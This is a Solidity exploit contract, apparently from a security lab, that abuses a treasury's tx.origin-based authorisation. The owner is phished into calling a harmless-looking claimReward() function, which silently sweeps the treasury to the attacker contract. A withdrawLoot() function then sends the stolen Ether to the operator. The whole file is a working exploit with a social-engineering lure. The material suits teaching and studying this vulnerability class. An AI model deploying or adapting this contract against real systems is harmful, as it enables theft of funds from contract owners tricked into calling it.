// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.28;

import "./Vulnerable.sol";

interface ISweepableTreasury {
    function sweepTo(address recipient) external;
}

/// @title TxOriginPhishingAttacker
/// @author Solidity Security Lab
/// @notice Exploit contract that abuses tx.origin-based authorization to drain a treasury.
contract TxOriginPhishingAttacker {
    /// @notice Vulnerable treasury targeted by the phishing flow.
    ISweepableTreasury public immutable target;

    /// @notice Operator who deployed the attacker contract and receives the stolen funds.
    address public immutable operator;

    /// @notice Emitted when the phishing path is triggered.
    event PhishingTriggered(address indexed caller);

    /// @notice Emitted when stolen Ether is withdrawn to the attacker operator.
    event LootWithdrawn(address indexed recipient, uint256 amount);

    constructor(address targetAddress) {
        target = ISweepableTreasury(targetAddress);
        operator = msg.sender;
    }

    /// @notice Function the owner is socially engineered into calling.
    /// @dev The caller believes they are interacting with something harmless,
    ///      but this function silently forwards a privileged call to the vulnerable treasury.
    function claimReward() external {
        emit PhishingTriggered(msg.sender);

        // Because the vulnerable treasury checks tx.origin instead of msg.sender,
        // a call from the real owner through this attacker contract will pass authorization.
        target.sweepTo(address(this));
    }

    /// @notice Transfers the stolen Ether to the attacker operator.
    function withdrawLoot() external {
        require(msg.sender == operator, "Only operator can withdraw loot");

        uint256 lootAmount = address(this).balance;
        require(lootAmount > 0, "No loot available");

        (bool success, ) = payable(operator).call{value: lootAmount}("");
        require(success, "Loot transfer failed");

        emit LootWithdrawn(operator, lootAmount);
    }

    receive() external payable {}
}
